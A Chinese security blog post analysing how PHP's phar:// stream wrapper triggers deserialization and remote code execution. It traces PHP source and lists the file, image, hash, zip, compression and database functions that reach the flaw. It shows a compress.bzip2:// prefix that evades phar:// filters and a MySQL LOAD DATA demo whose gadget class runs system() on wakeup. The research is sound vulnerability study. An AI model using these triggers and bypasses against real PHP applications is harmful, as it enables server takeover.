<p>因此，我们发现，一个 stream wrapper，它支持以下功能：打开文件（夹）、删除文件（夹）、重命名文件（夹），以及获取文件的meta。我们很容易就能断定，类似<code>unlink</code>等函数也是同样通过这个 streams api 进行操作。</p>
<p>Sam Thomas 的 pdf 指出</p>
<blockquote>
<p>This is true for both direct file operations (such as<br>“file_exists”) and indirect operations such as those that occur during external entity processing<br>within XML (i.e. when an XXE vulnerability is being exploited).</p>
</blockquote>
<p>我们通过试验也很容易发现，类似<code>unlink</code>等函数也均是可以使用的。</p>
<p><img src="https://static-up.zsxsoft.com/zb_users/upload/2018/10/20181022192403154020744369566.png" alt=""></p>
<p>知道创宇404实验室的研究员 seaii 更为我们指出了所有文件函数均可使用（<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a> ）：</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li><li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li><li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / <code>fopen`</code></li><li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li><li><code>parse_ini_file</code></li><li><code>unlink</code></li><li><code>copy</code></li></ul>
<p><img src="https://static-up.zsxsoft.com/zb_users/upload/2018/10/20181022191840154020712093196.png" alt=""></p>
<p>仅仅是知道一些受影响的函数，就够了吗？为什么就可以使用了呢？</p>
<h2 id="h2-u5BFBu627Eu53D7u5BB3u8005"><a name="寻找受害者" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>寻找受害者</h2><p>当然不够。我们需要先找到其原理，然后往下深入挖掘。<br>先看<code>file_get_contents</code>的代码。其调用了</p>
<pre><code class="language-php">stream = php_stream_open_wrapper_ex(filename, &quot;rb&quot; ....);</code></pre>
<p>这么个函数。</p>
<p>再看<code>unlink</code>的代码，其调用了</p>
<pre><code class="language-php">wrapper = php_stream_locate_url_wrapper(filename, NULL, 0);</code></pre>
<p>这么个函数。</p>
<p>从<code>php_stream_open_wrapper_ex</code>的<a href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/streams/streams.c#L2010">实现</a>，可以看到，其也调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper， <a href="https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c">https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c</a><br>其定义如下：</p>
<pre><code class="language-c">const php_stream_wrapper_ops phar_stream_wops = {
    phar_wrapper_open_url,
    NULL,                  /* phar_wrapper_close */
    NULL,                  /* phar_wrapper_stat, */
    phar_wrapper_stat,     /* stat_url */
    phar_wrapper_open_dir, /* opendir */
    &quot;phar&quot;,
    phar_wrapper_unlink,   /* unlink */
    phar_wrapper_rename,   /* rename */
    phar_wrapper_mkdir,    /* create directory */
    phar_wrapper_rmdir,    /* remove directory */
    NULL
};</code></pre>
<p>接着，让我们翻这几个函数的实现，会发现它们都调用了<code>phar_parse_url</code>，这个函数再调用<code>phar_open_or_create_filename</code> -&gt; <code>phar_create_or_parse_filename</code> -&gt; <code>phar_open_from_fp</code> -&gt; <code>phar_parse_pharfile</code> -&gt; <code>phar_parse_metadata</code> -&gt; <code>phar_var_unserialize</code>。因此，明面上来看，所有文件函数，均可以触发此phar漏洞，因为它们都直接或间接地调用了这个wrapper。</p>
<p>只是这些文件函数，就够了吗？<br>当然不够。这是一个所有的和IO有关的函数，都可能触发的问题。</p>
<p>前面我已经指出，它们都有一个共同特征，就是调用了<code>php_stream_locate_url_wrapper</code>。但是这个不那么好用，换<code>php_stream_open_wrapper</code>更合适点。让我们搜索一下PHP源代码吧，</p>
<p>我们很快就能发现，操作文件的<code>touch</code>，也是能触发它的。不看文件了，我们假设文件全部都能用。</p>
<p>我们会惊讶（一点都不）地发现：</p>
<h3 id="h3-exif"><a name="exif" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>exif</h3><ul>
<li><code>exif_thumbnail</code></li><li><code>exif_imagetype</code></li></ul>
<h3 id="h3-gd"><a name="gd" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>gd</h3><ul>
<li><code>imageloadfont</code></li><li><code>imagecreatefrom***</code></li></ul>
<h3 id="h3-hash"><a name="hash" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>hash</h3><ul>
<li><code>hash_hmac_file</code></li><li><code>hash_file</code></li><li><code>hash_update_file</code></li><li><code>md5_file</code></li><li><code>sha1_file</code></li></ul>
<h3 id="h3-file-url"><a name="file / url" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>file / url</h3><ul>
<li><code>get_meta_tags</code></li><li><code>get_headers</code></li></ul>
<h3 id="h3-standard"><a name="standard" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>standard</h3><ul>
<li><code>getimagesize</code></li><li><code>getimagesizefromstring</code></li></ul>
<h2 id="h2-zip"><a name="zip" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>zip</h2><pre><code class="language-php">$zip = new ZipArchive();
$res = $zip-&gt;open(&#39;c.zip&#39;);
$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);</code></pre>
<h3 id="h3-bzip-gzip"><a name="Bzip / Gzip" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>Bzip / Gzip</h3><p>这，够了吗？non non哒哟！</p>
<p>如果题目限制了，<code>phar://</code>不能出现在头几个字符怎么办？请欣赏你船未见过的船新操作。</p>
<pre><code>$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></pre><p><img src="https://static-up.zsxsoft.com/zb_users/upload/2018/10/201810222048564120307.png" alt=""></p>
<p>当然，它同样适用于<code>compress.zlib://</code>。</p>
<h3 id="h3-postgres"><a name="Postgres" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>Postgres</h3><p>再来个数据库吧！</p>
<pre><code class="language-php">&lt;?php
$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));
@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://test.phar/aa&#39;);</code></pre>
<p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p>
<h3 id="h3-mysql"><a name="MySQL" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>MySQL</h3><p>还有什么骚操作呢？<br>……MySQL？<br>走你！</p>
<p>我们注意到，<code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code>. 让我们测试一下。</p>
<pre><code class="language-php">&lt;?php
class A {
    public $s = &#39;&#39;;
    public function __wakeup () {
        system($this-&gt;s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, &#39;localhost&#39;, &#39;root&#39;, &#39;123456&#39;, &#39;easyweb&#39;, 3306);
$p = mysqli_query($m, &#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;);</code></pre>
<p>再配置一下mysqld。</p>
<pre><code class="language-ini">[mysqld]
local-infile=1
secure_file_priv=&quot;&quot;</code></pre>
<p>……然后，走你！</p>
<p><img src="https://static-up.zsxsoft.com/zb_users/upload/2018/10/201810222135135740815.png" alt=""></p>
<p>这就是我想要看到的舞台！——长颈鹿<br>很可惜，这不是默认配置；但是，嗯，很有意思。</p>
<p>我相信，PHP代码内部还有相当多的<code>php_stream_open_wrapper</code>等待挖掘，这只是关于stream wrapper利用的一小步。</p>
</article><div class="social-share a3f4f9"></div></div><div class="a3f4f9"><p>如果本文对你有帮助，你可以用支付宝支持一下：</p><div><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0ppVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NkUyNjNGOENBQkU4MTFFN0I2ODRCRjk1N0NEMDE1OUUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NkUyNjNGOEJBQkU4MTFFN0I2ODRCRjk1N0NEMDE1OUUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDplYTllY2U0ZS1hYmU2LTExZTctODg3Mi1iZmEwOTE4YWIwMDciIHN0UmVmOmRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDplYTllY2U0ZS1hYmU2LTExZTctODg3Mi1iZmEwOTE4YWIwMDciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+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" alt="Alipay QrCode" title="Alipay QrCode" style="border-radius:0;box-shadow:none;height:128px"/></div></div><div><div><div class="jss38 jss41 jss39 jss37 fe30df"><div class="jss68 _399caa"><div class="jss69"><div class="jss65 _994ddb"><img src="https://cn.gravatar.com/avatar/03becd9a38b03715b8fa709e5cf1ddc1?s=60&amp;d=mm&amp;r=G" class="jss67"/></div></div><div class="jss71"><span class="jss74 jss82 jss72"><span class="aebbe5"><a href="http://tinmin.cn" target="_blank" rel="nofollow">tinmin</a><span> at 2019/8/27</span><a class="_55bf3f" href="javascript:;">[回复]</a></span></span><span class="jss74 jss82 jss107 jss73"></span></div></div><div class="jss110 _5109d3">师傅好，我想问一下，我用ubuntu18.04 配置了mysql5.7 [mysql]<br/>local-infile=1<br/>[mysqld]<br/>local-infile=1<br/>secure_file_priv=""<br/>，然后php7.2.19运行了那段代码,显示PHP Warning: mysqli_query(): LOAD DATA LOCAL INFILE forbidden in /home/tinmin/Desktop/index.php on line 11，网上查的还是没解决<label id="AjaxComment395"></label></div></div><div class="jss38 jss41 jss39 jss37"><form id="comment-post"><div class="jss110"><div class="jss111 _11683a"><label class="jss126 jss115 jss120 jss123" data-shrink="false">Name</label><div class="jss146 jss133 jss137 jss147 jss134"><input type="text" aria-invalid="false" class="jss156 jss141" value=""/></div></div><div class="jss111 _11683a"><label class="jss126 jss115 jss120 jss123" data-shrink="false">Email</label><div class="jss146 jss133 jss137 jss147 jss134"><input type="email" aria-invalid="false" class="jss156 jss141 jss159 jss144" value=""/></div></div><div class="jss111 _11683a"><label class="jss126 jss115 jss120 jss123" data-shrink="false">Website</label><div class="jss146 jss133 jss137 jss147 jss134"><input type="text" aria-invalid="false" class="jss156 jss141" value=""/></div></div><div class="jss111 a98d2a"><label class="jss126 jss115 jss120 jss123" data-shrink="false">Content</label><div class="jss146 jss133 jss137 jss147 jss134 jss154 jss139"><textarea aria-invalid="false" class="jss156 jss141 jss158 jss143" placeholder="谢绝“好厉害”“好屌”“支持”“顶”等无意义评论；当我回复你的评论时，你会收到邮件提醒。" rows="3"></textarea></div></div></div><div class="jss163"><button class="jss21 jss166 jss177 jss178 jss180 jss181 jss191 jss165" tabindex="0" type="button"><span class="jss167">COMMENT NOW</span></button></div></form></div></div></div></div></div><div class="a45bbd"><a class="jss21 jss166 jss177 jss178 jss180 jss181" tabindex="0" role="button" href="https://blog.zsxsoft.com/post/37"><span class="jss167">← V8 Snapshot / Nw.js Source Protection 研究笔记</span></a><a class="jss21 jss166 jss177 jss178 jss180 jss181" tabindex="0" role="button" href="https://blog.zsxsoft.com/post/39"><span class="jss167">Nextjs实现纯CSR →</span></a></div></div></section><div class="_9b66ff bf859b" style="left:3em"><button class="jss21 jss166 jss183 jss177 jss178 jss180 jss181" tabindex="0" type="button"><span class="jss167"><svg class="jss24" focusable="false" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path fill="none" d="M0 0h24v24H0z"></path><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"></path></svg></span></button></div><div class="_9b66ff bf859b" style="right:3em"><button class="jss21 jss166 jss183 jss177 jss178 jss180 jss181" tabindex="0" type="button"><span class="jss167"><svg class="jss24" focusable="false" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path><path fill="none" d="M0 0h24v24H0z"></path></svg></span></button></div></main><footer class="_1a62db"><div>未经特别标明，本站所有文章均采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。</div><div>Copyright © 2023 zsx <a href="https://blog.zsxsoft.com/feed.php" target="_blank">[RSS]</a></div><div>API by <a href="https://www.zblogcn.com/" target="_blank">Z-BlogPHP</a>, Theme by zsx: <a href="https://github.com/zsxsoft/blog.zsxsoft.com" target="_blank">[Source]</a></div><div class="_1e210f"><a href="http://www.miitbeian.gov.cn/" target="_blank" rel="nofollow noopener noreferrer">闽ICP备15006942号</a>  <a target="_blank" rel="_nofollow noopener noreferrer" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=35010302000147">闽公网安备 35010302000147 号</a></div></footer></div><script>__NEXT_DATA__ ={"props":{"pageProps":{"loading":false,"data":{"article":{"ID":"38","Category":{"ID":"9","Name":"代码分析","Url":"https://blog.zsxsoft.com/?cate=9"},"Author":{"ID":"1","StaticName":"zsx","Avatar":"https://blog.zsxsoft.com/zb_users/avatar/1.png"},"Tag":"{6}{83}{84}{78}{16}","Status":"0","Type":"0","Alias":"php-stream-wrapper-rce","IsTop":"0","IsLock":false,"Title":"Phar与Stream Wrapper造成PHP RCE的深入挖掘","Content":"\u003cp\u003e今年的HITCON打完了，沉迷写前端搞Nextjs骚操作的我成功爆0（雾），不想写前端了.jpg。\u003c/p\u003e\r\n\u003cp\u003e先跑个题。\u003cbr\u003eHITCON 2016上，?出了一道PHP反序列化。\u003cbr\u003eHITCON 2017上，?出了一道Phar + PHP反序列化。\u003cbr\u003eHITCON 2018上，?出了一道file_get_contents + Phar + PHP反序列化。\u003cbr\u003e让我们期待HITCON 2019的操作（雾。\u003c/p\u003e\r\n\u003ch2 id=\"h2-phar-rce\"\u003e\u003ca name=\"Phar RCE\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003ePhar RCE\u003c/h2\u003e\u003cp\u003e今年HITCON上，\u003ccode\u003ebaby cake\u003c/code\u003e这一题，涉及到了今年BlackHat大会上的Sam Thomas分享的\u003ccode\u003eFile Operation Induced Unserialization via the “phar://” Stream Wrapper\u003c/code\u003e这个议题，见：\u003ca href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\" \u003ehttps://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\u003c/a\u003e 。它的主要内容是，通过\u003ccode\u003ephar://\u003c/code\u003e协议对一个\u003ccode\u003ephar\u003c/code\u003e文件进行文件操作，如\u003ccode\u003efile_get_contents\u003c/code\u003e，就可以触发反序列化，从而达成RCE的效果。\u003c/p\u003e\r\n\u003cp\u003e在文章开头部分，让我先对phar反序列化做一些小小的分析。我们直接阅读PHP源码。在 \u003ca href=\"https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618\" \u003ephar.c#L618\u003c/a\u003e 处，其调用了\u003ccode\u003ephp_var_unserialize\u003c/code\u003e。\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e        if (!php_var_unserialize(metadata, \u0026amp;p, p + zip_metadata_len, \u0026amp;var_hash)) {\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e因此可以构造一个特殊的phar包，使得攻击代码能够被反序列化，从而构造一个POP链。这一部分已经太常见了，CTF比赛中都出烂了，没什么值得继续讨论的。值得关注的是到底为什么\u003ccode\u003efile_get_contents\u003c/code\u003e能够实现RCE。\u003c/p\u003e\r\n\u003ch2 id=\"h2-stream-api\"\u003e\u003ca name=\"Stream API\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003eStream API\u003c/h2\u003e\u003cp\u003e因此，为解决这个问题，我们需要首先阅读此函数的源码。大概在此处：\u003ca href=\"https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548\" \u003ehttps://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548\u003c/a\u003e ，重点关注此行：\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e    stream = php_stream_open_wrapper_ex(filename, \u0026quot;rb\u0026quot;,\r\n                (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,\r\n                NULL, context);\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e可以注意，其使用的是php_stream系列API来打开一个文件。阅读PHP的这篇文档：\u003ca href=\"https://secure.php.net/manual/zh/internals2.ze1.streams.php\" \u003eStreams API for PHP Extension Authors\u003c/a\u003e，可知，Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。而本次事件的主角，也就是phar这个扩展，其就注册了\u003ccode\u003ephar://\u003c/code\u003e这个stream wrapper。可以使用\u003ccode\u003estream_get_wrapper\u003c/code\u003e看到系统内注册了哪一些wrapper，但其余的没什么值得关注的。\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003ephp \u0026gt; var_dump(stream_get_wrappers());\r\narray(12) {\r\n  [0]=\u0026gt;\r\n  string(5) \u0026quot;https\u0026quot;\r\n  [1]=\u0026gt;\r\n  string(4) \u0026quot;ftps\u0026quot;\r\n  [2]=\u0026gt;\r\n  string(13) \u0026quot;compress.zlib\u0026quot;\r\n  [3]=\u0026gt;\r\n  string(14) \u0026quot;compress.bzip2\u0026quot;\r\n  [4]=\u0026gt;\r\n  string(3) \u0026quot;php\u0026quot;\r\n  [5]=\u0026gt;\r\n  string(4) \u0026quot;file\u0026quot;\r\n  [6]=\u0026gt;\r\n  string(4) \u0026quot;glob\u0026quot;\r\n  [7]=\u0026gt;\r\n  string(4) \u0026quot;data\u0026quot;\r\n  [8]=\u0026gt;\r\n  string(4) \u0026quot;http\u0026quot;\r\n  [9]=\u0026gt;\r\n  string(3) \u0026quot;ftp\u0026quot;\r\n  [10]=\u0026gt;\r\n  string(4) \u0026quot;phar\u0026quot;\r\n  [11]=\u0026gt;\r\n  string(3) \u0026quot;zip\u0026quot;\r\n}\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e那么，注册一个 stream wrapper，能实现什么功能呢？很容易就能找到其定义：\u003ca href=\"https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132\" \u003ehttps://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132\u003c/a\u003e\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003etypedef struct _php_stream_wrapper_ops {\r\n    /* open/create a wrapped stream */\r\n    php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,\r\n            int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);\r\n    /* close/destroy a wrapped stream */\r\n    int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream);\r\n    /* stat a wrapped stream */\r\n    int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb);\r\n    /* stat a URL */\r\n    int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context);\r\n    /* open a \u0026quot;directory\u0026quot; stream */\r\n    php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,\r\n            int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);\r\n    const char *label;\r\n    /* delete a file */\r\n    int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);\r\n    /* rename a file */\r\n    int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context);\r\n    /* Create/Remove directory */\r\n    int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context);\r\n    int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);\r\n    /* Metadata handling */\r\n    int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context);\r\n} php_stream_wrapper_ops;\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e因此，我们发现，一个 stream wrapper，它支持以下功能：打开文件（夹）、删除文件（夹）、重命名文件（夹），以及获取文件的meta。我们很容易就能断定，类似\u003ccode\u003eunlink\u003c/code\u003e等函数也是同样通过这个 streams api 进行操作。\u003c/p\u003e\r\n\u003cp\u003eSam Thomas 的 pdf 指出\u003c/p\u003e\r\n\u003cblockquote\u003e\r\n\u003cp\u003eThis is true for both direct file operations (such as\u003cbr\u003e“file_exists”) and indirect operations such as those that occur during external entity processing\u003cbr\u003ewithin XML (i.e. when an XXE vulnerability is being exploited).\u003c/p\u003e\r\n\u003c/blockquote\u003e\r\n\u003cp\u003e我们通过试验也很容易发现，类似\u003ccode\u003eunlink\u003c/code\u003e等函数也均是可以使用的。\u003c/p\u003e\r\n\u003cp\u003e\u003cimg src=\"https://static-up.zsxsoft.com/zb_users/upload/2018/10/20181022192403154020744369566.png\" alt=\"\"\u003e\u003c/p\u003e\r\n\u003cp\u003e知道创宇404实验室的研究员 seaii 更为我们指出了所有文件函数均可使用（\u003ca href=\"https://paper.seebug.org/680/\" \u003ehttps://paper.seebug.org/680/\u003c/a\u003e ）：\u003c/p\u003e\r\n\u003cul\u003e\r\n\u003cli\u003e\u003ccode\u003efileatime\u003c/code\u003e / \u003ccode\u003efilectime\u003c/code\u003e / \u003ccode\u003efilemtime\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003estat\u003c/code\u003e / \u003ccode\u003efileinode\u003c/code\u003e / \u003ccode\u003efileowner\u003c/code\u003e / \u003ccode\u003efilegroup\u003c/code\u003e / \u003ccode\u003efileperms\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003efile\u003c/code\u003e / \u003ccode\u003efile_get_contents\u003c/code\u003e / \u003ccode\u003ereadfile\u003c/code\u003e / \u003ccode\u003efopen`\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003efile_exists\u003c/code\u003e / \u003ccode\u003eis_dir\u003c/code\u003e / \u003ccode\u003eis_executable\u003c/code\u003e / \u003ccode\u003eis_file\u003c/code\u003e / \u003ccode\u003eis_link\u003c/code\u003e / \u003ccode\u003eis_readable\u003c/code\u003e / \u003ccode\u003eis_writeable\u003c/code\u003e / \u003ccode\u003eis_writable\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003eparse_ini_file\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003eunlink\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003ecopy\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\r\n\u003cp\u003e\u003cimg 